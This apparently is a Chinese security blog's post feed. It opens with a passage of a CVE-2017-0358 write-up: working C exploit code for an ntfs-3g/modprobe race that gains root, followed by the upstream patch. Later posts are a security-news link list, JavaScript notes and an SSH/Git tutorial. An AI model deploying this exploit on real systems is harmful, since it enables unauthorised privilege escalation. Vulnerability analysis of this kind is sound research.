err(<span class="number">1</span>, <span class="string">"unable to watch /proc/filesystems"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up inotify watch for /sbin/modprobe.</span></span><br><span class="line"><span class="comment">// This can be used to detect when we can release all our open files.</span></span><br><span class="line"><span class="keyword">int</span> modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);</span><br><span class="line"><span class="keyword">if</span> (modprobe_inotify_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to create inotify fd?"</span>);</span><br><span class="line"><span class="keyword">if</span> (inotify_add_watch(modprobe_inotify_fd, <span class="string">"/sbin/modprobe"</span>, IN_OPEN) == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to watch /sbin/modprobe"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> do_exec_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (pipe2(do_exec_pipe, O_CLOEXEC))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"pipe"</span>);</span><br><span class="line"><span class="keyword">pid_t</span> child = fork();</span><br><span class="line"><span class="keyword">if</span> (child == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"fork"</span>);</span><br><span class="line"><span class="keyword">if</span> (child != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read(do_exec_pipe[<span class="number">0</span>], buf, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">        errx(<span class="number">1</span>, <span class="string">"pipe read failed"</span>);</span><br><span class="line">    <span class="keyword">char</span> modprobe_opts[<span class="number">300</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(modprobe_opts, <span class="string">"-C %s -d %s"</span>, modprobe_confdir, <span class="keyword">template</span>);</span><br><span class="line">    setenv(<span class="string">"MODPROBE_OPTIONS"</span>, modprobe_opts, <span class="number">1</span>);</span><br><span class="line">    execlp(<span class="string">"ntfs-3g"</span>, <span class="string">"ntfs-3g"</span>, volume, mountpoint, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">child = getpid();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now launch ntfs-3g and wait until it opens /proc/mounts</span></span><br><span class="line"><span class="keyword">if</span> (write(do_exec_pipe[<span class="number">1</span>], buf, <span class="number">1</span>) != <span class="number">1</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"pipe write failed"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (read(inotify_fd, buf, <span class="keyword">sizeof</span>(buf)) &lt;= <span class="number">0</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">"inotify read failed"</span>);</span><br><span class="line"><span class="keyword">if</span> (kill(getppid(), SIGSTOP))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"can't stop setuid parent"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check whether we won the main race.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">poll_fds</span>[1] = &#123;</span>&#123;</span><br><span class="line">    .fd = fs_inotify_fd,</span><br><span class="line">    .events = POLLIN</span><br><span class="line">&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> poll_res = poll(poll_fds, <span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span> (poll_res == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"poll"</span>);</span><br><span class="line"><span class="keyword">if</span> (poll_res == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"looks like we lost the race"</span>);</span><br><span class="line">    <span class="keyword">if</span> (kill(getppid(), SIGKILL))</span><br><span class="line">        perror(<span class="string">"SIGKILL after lost race"</span>);</span><br><span class="line">    <span class="keyword">char</span> rm_cmd[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(rm_cmd, <span class="string">"rm -rf %s"</span>, <span class="keyword">template</span>);</span><br><span class="line">    system(rm_cmd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"looks like we won the race"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open as many files as possible. Whenever we have</span></span><br><span class="line"><span class="comment">// a bunch of open files, move them into a new process.</span></span><br><span class="line"><span class="keyword">int</span> total_open_files = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> LIMIT 500</span></span><br><span class="line">    <span class="keyword">int</span> open_files[LIMIT];</span><br><span class="line">    <span class="keyword">bool</span> reached_limit = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> n_open_files;</span><br><span class="line">    <span class="keyword">for</span> (n_open_files = <span class="number">0</span>; n_open_files &lt; LIMIT; n_open_files++) &#123;</span><br><span class="line">        open_files[n_open_files] = eventfd(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (open_files[n_open_files] == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno != ENFILE)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">"eventfd() failed"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"got ENFILE at %d total\n"</span>, total_open_files);</span><br><span class="line">            reached_limit = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        total_open_files++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pid_t</span> fd_stasher_child = fork();</span><br><span class="line">    <span class="keyword">if</span> (fd_stasher_child == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"fork (for eventfd holder)"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd_stasher_child == <span class="number">0</span>) &#123;</span><br><span class="line">        prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">        <span class="comment">// close PR_SET_PDEATHSIG race window</span></span><br><span class="line">        <span class="keyword">if</span> (getppid() != child) raise(SIGKILL);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) pause();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n_open_files; i++)</span><br><span class="line">        close(open_files[i]);</span><br><span class="line">    <span class="keyword">if</span> (reached_limit)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wake up ntfs-3g and keep allocating files, then free up</span></span><br><span class="line"><span class="comment">// the files as soon as we're reasonably certain that either</span></span><br><span class="line"><span class="comment">// modprobe was spawned or the attack failed.</span></span><br><span class="line"><span class="keyword">if</span> (kill(getppid(), SIGCONT))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"SIGCONT"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">time_t</span> start_time = time(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> efd = eventfd(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (efd == <span class="number">-1</span> &amp;&amp; errno != ENFILE)</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">"gapfiller eventfd() failed unexpectedly"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">modprobe_poll_fds</span>[1] = &#123;</span>&#123;</span><br><span class="line">        .fd = modprobe_inotify_fd,</span><br><span class="line">        .events = POLLIN</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> modprobe_poll_res = poll(modprobe_poll_fds, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_poll_res == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"poll"</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_poll_res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"yay, modprobe ran!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (time(<span class="literal">NULL</span>) &gt; start_time + <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"modprobe didn't run?"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-补丁代码，load-fuse-module-函数"><a href="#0x04-补丁代码，load-fuse-module-函数" class="headerlink" title="0x04 补丁代码，load_fuse_module()函数"></a>0x04 补丁代码，<code>load_fuse_module()</code>函数</h2><hr><p><a href="http://seclists.org/oss-sec/2017/q1/307" target="_blank" rel="noopener">http://seclists.org/oss-sec/2017/q1/307</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *cmd = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line">+   <span class="keyword">char</span> *env = (<span class="keyword">char</span>*)<span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">req</span> = &#123;</span> <span class="number">0</span>, <span class="number">100000000</span> &#125;;  <span class="comment">/* 100 msec */</span></span><br><span class="line">    fuse_fstype fstype;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123;</span><br><span class="line">            pid = fork();</span><br><span class="line">            <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">-                  execl(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>);</span><br><span class="line">+                  execle(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>, &amp;env);</span><br><span class="line">                    _exit(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>)</span><br><span class="line">                    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CVE_Search </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>腾讯玄武实验室安全动态推送</title>
      <link href="/2018/10/21/xuanwu-2018-10-21/"/>
      <url>/2018/10/21/xuanwu-2018-10-21/</url>
      
        <content type="html"><![CDATA[<p>Tencent Xuanwu Lab Security Daily News</p><ul><li><p>[ Browser ]  Firefox JavaScript 类型混淆 RCE 漏洞（CVE-2018-12386）的详细分析： <a href="https://blogs.securiteam.com/index.php/archives/3765" target="_blank" rel="noopener">https://blogs.securiteam.com/index.php/archives/3765</a></p></li><li><p>[ Industry News ]  2018年12月31日 PHP 5.6.x 的安全支持将正式停止，大约 62％ 的互联网站点将运行不受支持的 PHP 版本: <a href="https://www.zdnet.com/article/around-62-of-all-internet-sites-will-run-an-unsupported-php-version-in-10-weeks/" target="_blank" rel="noopener">https://www.zdnet.com/article/around-62-of-all-internet-sites-will-run-an-unsupported-php-version-in-10-weeks/</a></p></li><li><p>[ MalwareAnalysis ]  通过动态二进制文件检测，对轻量级恶意软件进行行为分析: <a href="https://www.slideshare.net/MaximShudrak/tricky-sample-hack-it-easy-applying-dynamic-binary-inastrumentation-to-lightweight-malware-behaviour-analysis" target="_blank" rel="noopener">https://www.slideshare.net/MaximShudrak/tricky-sample-hack-it-easy-applying-dynamic-binary-inastrumentation-to-lightweight-malware-behaviour-analysis</a></p></li><li><p>[ Others ]  如何寻找新的持久化方式: <a href="http://www.hexacorn.com/blog/2018/10/14/how-to-find-new-persistence-tricks/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/2018/10/14/how-to-find-new-persistence-tricks/</a></p></li><li><p>[ Tools ]  haxxmap - 代理 IMAP 服务获取密码的工具: <a href="https://github.com/mrexodia/haxxmap" target="_blank" rel="noopener">https://github.com/mrexodia/haxxmap</a></p></li><li><p>[ Tools ]  ReconDog - 用于侦查信息的瑞士军刀: <a href="https://github.com/s0md3v/ReconDog" target="_blank" rel="noopener">https://github.com/s0md3v/ReconDog</a></p></li><li><p>[ Tools ]   tcpbin - 记录 TCP  Socket 详细日志的工具: <a href="https://github.com/ecx86/tcpbin" target="_blank" rel="noopener">https://github.com/ecx86/tcpbin</a></p></li><li><p>[ Tools ]  对专有汽车协议 CANalyzat0r 的安全分析工具: <a href="https://www.schutzwerk.com/en/43/posts/canalyzat0r/" target="_blank" rel="noopener">https://www.schutzwerk.com/en/43/posts/canalyzat0r/</a></p></li><li><p>[ Tools ]  censys-subdomain-finder - 从 Censys 的证书透明日志中收集子域名的工具: <a href="https://github.com/christophetd/censys-subdomain-finder" target="_blank" rel="noopener">https://github.com/christophetd/censys-subdomain-finder</a></p></li><li><p>[ Android ]  Android Pwn2Own 2017 漏洞的介绍与演示: <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/the-mate-escape-huawei-pwn2own-2018-10-13.pdf" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/assets/BlogFiles/the-mate-escape-huawei-pwn2own-2018-10-13.pdf</a></p></li><li><p>[ Blockchain ]  Not a fair game, Dice2win公平性分析: <a href="http://blogs.360.cn/post/Fairness_Analysis_of_Dice2win.html" target="_blank" rel="noopener">http://blogs.360.cn/post/Fairness_Analysis_of_Dice2win.html</a></p></li><li><p>[ Industry News ]  CloudFlare 将 XDP 集成到其 DDoS 缓解策略中： <a href="https://netdevconf.org/2.1/slides/apr6/bertin_Netdev-XDP.pdf" target="_blank" rel="noopener">https://netdevconf.org/2.1/slides/apr6/bertin_Netdev-XDP.pdf</a></p></li><li><p>[ MalwareAnalysis ]  对 Hancitor 恶意样本的深入分析： 1） <a href="https://0ffset.wordpress.com/2018/08/12/post-0x16-hancitor-stage-1/" target="_blank" rel="noopener">https://0ffset.wordpress.com/2018/08/12/post-0x16-hancitor-stage-1/</a> <a href="http://2" target="_blank" rel="noopener">2）https://0ffset.wordpress.com/2018/10/14/post-0x16-hancitor-stage-2/</a>https//0ffset.wordpress.com/2018/10/14/post-0x16-hancitor-stage-2/)</p></li><li><p>[ Mobile ]  GSM 移动网络简介-诺基亚网络监视器(Video)： <a href="https://www.youtube.com/watch?v=IuxBfHnP5S0" target="_blank" rel="noopener">https://www.youtube.com/watch?v=IuxBfHnP5S0</a></p></li><li><p>[ Others ]  Mozilla 公司的 Firefox 应用程序更新服务安全审计报告： <a href="https://drive.google.com/file/d/1v53GCYPxzoZmB1dCop1yJfZgS1wi64dS/view" target="_blank" rel="noopener">https://drive.google.com/file/d/1v53GCYPxzoZmB1dCop1yJfZgS1wi64dS/view</a></p></li><li><p>[ Others ]  ‘How to irregular cyber warfare’,关于不规则网络战策略的介绍: <a href="https://blog.erratasec.com/2018/10/how-to-irregular-cyber-warfare.html#.W8NRddUzaUk" target="_blank" rel="noopener">https://blog.erratasec.com/2018/10/how-to-irregular-cyber-warfare.html#.W8NRddUzaUk</a></p></li><li><p>[ Symbolic Execution ]  通过使用符号执行技术，自动化分析堆分配器，来评估一个补丁是否能缓解攻击 (paper): <a href="https://securitygossip.com/blog/2018/10/12/heaphopper-bringing-bounded-model-checking-to-heap-implementation-security/" target="_blank" rel="noopener">https://securitygossip.com/blog/2018/10/12/heaphopper-bringing-bounded-model-checking-to-heap-implementation-security/</a></p></li><li><p>[ Symbolic Execution ]  对 Symbolic Emulator 的详细介绍： Part 1 : <a href="https://sean.heelan.io/2012/03/23/anatomy-of-a-symbolic-emulator-part-1-trace-generation/" target="_blank" rel="noopener">https://sean.heelan.io/2012/03/23/anatomy-of-a-symbolic-emulator-part-1-trace-generation/</a> Part 2： <a href="https://sean.heelan.io/2012/03/23/anatomy-of-a-symbolic-emulator-part-2-introducing-symbolic-data/" target="_blank" rel="noopener">https://sean.heelan.io/2012/03/23/anatomy-of-a-symbolic-emulator-part-2-introducing-symbolic-data/</a></p></li><li><p>[ Tools ]  适用于 Oracle JDBC 的后门介绍： <a href="https://medium.com/@airman604/introducing-jdbc-backdoor-175fbb509f62" target="_blank" rel="noopener">https://medium.com/@airman604/introducing-jdbc-backdoor-175fbb509f62</a> GitHub: <a href="https://github.com/airman604/jdbc-backdoor" target="_blank" rel="noopener">https://github.com/airman604/jdbc-backdoor</a></p></li><li><p>[ Tools ]  drAFL - AFL + DynamoRIO 可以 Fuzzing Linu x上没有源代码的二进制文件 ： <a href="https://github.com/mxmssh/drAFL" target="_blank" rel="noopener">https://github.com/mxmssh/drAFL</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 腾讯玄武实验室安全动态推送 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SecNews </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS学习笔记（一）</title>
      <link href="/2017/05/03/JS-study-%E4%B8%80/"/>
      <url>/2017/05/03/JS-study-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>JavaScript学习笔记。<br><a id="more"></a></p><h2 id="一、在HTML中使用JS"><a href="#一、在HTML中使用JS" class="headerlink" title="一、在HTML中使用JS"></a>一、在HTML中使用JS</h2><p>&lt;script>元素，HTML 4.01为&lt;/script>定义了以下6个属性：</p><blockquote><p>async:可选。表示应该立即下载脚本，但不应该妨碍页面中的其他操作，只对外部脚本文件有效。<br>charset:可选。表示通过src属性指定的代码的字符集。<br>defer:可选。表示脚本可以延迟到文档完全被解析和显示之后再执行，只对外部脚本文件有效。<br>src:可选。表示包含要执行代码的外部文件。<br>type:可选。表示编写代码使用的脚本语言的内容类型（MIME）。  </p></blockquote><h2 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h2><p>JS的语法大量借鉴了C及其他类C语言的语法，有C语言基础的同学在倍感亲切的同时，一定要注意JS与C的差异。  </p><ul><li>区分大小写：JS中的一切（变量、函数名、操作符）都区分大小写。  </li><li>标识符（变量、函数、属性的名字）：第一个字符必须是一个字母、下划线(_)或美元符号($)。  </li><li>变量：JS的变量为弱类型  </li></ul><p>按照惯例，JS标识符采用驼峰大小写格式，也就是第一个字母小写，剩下的每个单词的首字母大写。  </p><p><strong>数据类型</strong>  </p><p>JS具有5种简单类型(<em>Undefined、Null、Boolean、Number、String</em>)和1种复杂类型（Object），<em>Object本质上是由一组无序的名值对组成的</em>。</p><p>Object类型是所有它的实例的基础，它的每个实例都具备下列属性和方法：</p><blockquote><p>constructor:保存着用于创建当前对象的函数。<br>hasOwnProperty(<em>propertyName</em>):用于检查给定的属性在当前对象的实例中是否存在。<br>isPrototypeOf(<em>object</em>):用于检查传入的对象是否是当前对象的原型。<br>propertyIsEnumerable(<em>propertyName</em>):用于检查给定的属性是否能够使用for-in 语句枚举。<br>toLocaleString():返回对象的字符串表示，该字符串与执行环境的地区相对应。<br>toString():返回对象的字符串表示。<br>valueOf():返回对象的字符串、数值或布尔值表示。通常与toString（）方法的返回值一致。  </p></blockquote><p><strong>语句</strong>  </p><p>  1.for-in语句:一种精准的迭代语句，可以用来枚举对象的属性。语法如下：</p><blockquote><p>for (var propName in expression) statement  </p></blockquote><p>  下面是一个示例：<br>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> propName <span class="keyword">in</span> <span class="built_in">window</span>) &#123;</span><br><span class="line">   <span class="built_in">document</span>.write(propName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  在这个例子中，枚举了BOM中window对象的所有属性，直到对象中的所有属性都被枚举一遍为止。</p><p>  2.label语句：在代码中添加标签，以便以后使用，一般配合for、break或continue语句引用。语法如下：</p><blockquote><p>label: statement  </p></blockquote><p>  示例：<br>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">outermost:</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i ==<span class="number">5</span> &amp;&amp; j==<span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span> outermost;</span><br><span class="line">        &#125;</span><br><span class="line">        num++;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alert(num);         <span class="comment">//55</span></span><br></pre></td></tr></table></figure></p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">outermost:</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i ==<span class="number">5</span> &amp;&amp; j==<span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> outermost;</span><br><span class="line">        &#125;</span><br><span class="line">        num++;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alert(num);         <span class="comment">//95</span></span><br></pre></td></tr></table></figure><p>3.with 语句：将代码的作用域设置到一个特定对象之中。语法：  </p><blockquote><p>with (expression) statement;  </p></blockquote><p>示例：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> qs = location.search.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> hostName = location.hostname;</span><br><span class="line"><span class="keyword">var</span> url = location.href;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span>(location)&#123;</span><br><span class="line"><span class="keyword">var</span> qs = search.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> hostName = hostname;</span><br><span class="line"><span class="keyword">var</span> url = href;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注：严格模式下不允许使用with语句。大量使用with语句将会导致性能下降。</p><p>4.理解参数<br>JS函数的参数与大多数其他语言中的参数有所不同。JS函数不介意传递进来多少个参数，也不在乎传递过来的参数是什么类型。也就是说，即便你定义的函数只接收两个参数，在调用这个函数时也未必一定要传递两个参数。可以传递一个、三个甚至不传递参数，而解析器永远不会有什么怨言。之所以会这样，是因为JS中的参数在内部是用一个数组表示的。函数接收到的始终是这个数组，而不关心数组中包含哪些参数。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>JS中的基本数据类型包括<em>Undefined、Null、Boolean、Number</em>和<em>String</em>。</li><li>与其他语言不同，JS没有为整数和浮点数分别定义不同的数据类型，<em>Number</em>类型可用于表示所有数值。</li><li>JS也有一种复杂数据类型，即<em>Object</em>类型，该类型是这门语言中所有对象的基础类型。</li><li>严格模式为这门语言中容易出错的地方施加了限制。</li><li>JS提供了很多与C及其他类C语言中相同的基本操作符，包括算数操作符、布尔操作符、关系操作符、相等操作符及赋值操作符等。</li><li>JS从其他语言中借鉴了很多流控制语句，例如if语句、for语句和switch语句等。</li></ul><p>JS中的函数与其他语言中的函数有诸多不同之处。</p><ul><li>无需指定函数的返回值，因为任何JS函数都可以在任何时候返回任何值。</li><li>实际上，未指定返回值的函数返回的是一个特殊的<em>Undefined</em>值。</li><li>JS中也没有函数签名的概念，因为其函数参数是以一个包含零或多个值的数组的形式传递的。</li><li>可以向JS函数传递任意数量的参数，并且可以通过arguments对象来访问这些参数。</li><li>由于不存在函数签名的概念，JS函数不能重载。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SSH &amp; Git</title>
      <link href="/2017/05/02/SSH-Git/"/>
      <url>/2017/05/02/SSH-Git/</url>
      
        <content type="html"><![CDATA[<p>　　利用SSH，在登录Git服务器的时候实现免密码登录。</p><a id="more"></a><p>一、单用户情况：</p><p>　　使用固定PC登录固定git服务器，不涉及多个账号或不同git服务器：</p><p>　　1.运行  ssh-keygen -t  rsa  -C  “<a href="mailto:xxx@xxx.xxx" target="_blank" rel="noopener">xxx@xxx.xxx</a>“<br>　　2.提示输入key的名字，使用默认id_rsa即可。<br>　　3.然后会提示输入口令，这里口令与Github中的密码无关，随便输入可以为空。<br>　　4.如果重命名过id_rsa，需要将新文件名添加到SSH agent中。 </p><p>　　完成后在.ssh/目录下可以看到id_rsa、id_rsa.pub两个文件，之后登陆git服务器，将id-rsa.pub中的内容作为公钥添加至git服务器 。</p><p>　　输入以下命令进行验证，若返回正常则添加成功。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -vT git@gitserver.xxx</span><br></pre></td></tr></table></figure></p><p>二、多账户情况</p><p>　　涉及多账户情况下，针对每个账户都需要一对公私钥。这就需要在使用ssh-keygen创建秘钥时进行重命名。具体如下：</p><p>1.新建user2的SSH Key<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#新建SSH key：</span></span><br><span class="line">$ <span class="built_in">cd</span> ~/.ssh    </span><br><span class="line">ssh-keygen -t rsa -C <span class="string">"xxx@xxx.xxx"</span>  </span><br><span class="line"><span class="comment"># 重命名为id_oschina_rsa</span></span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (~/.ssh/id_rsa): id_oschina_rsa</span><br></pre></td></tr></table></figure></p><p>2.新密钥添加到SSH agent中</p><p>　　因为默认只读取id_rsa，为了让SSH识别新的私钥，需将其添加到SSH agent中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add  ~/.ssh/id_oschina_rsa</span><br></pre></td></tr></table></figure></p><p>3.修改~/.ssh目录下的config文件，若没有则创建（touch config），我的config配置如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Default github user</span></span><br><span class="line">Host github.com</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_github_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># second user</span></span><br><span class="line"><span class="comment"># 可以是同一服务器的不同用户，也可以是不同服务器的用户，</span></span><br><span class="line"><span class="comment"># 通过 Host、HostName、User区分</span></span><br><span class="line">Host oschina.net</span><br><span class="line">HostName oschina.net</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_oschina_rsa</span><br></pre></td></tr></table></figure></p><p>4.cat ~/.ssh/id_xxx_rsa.pub文件，将每个用户的公钥都添加至对应的git服务器中。</p><p>5.测试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi git! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span 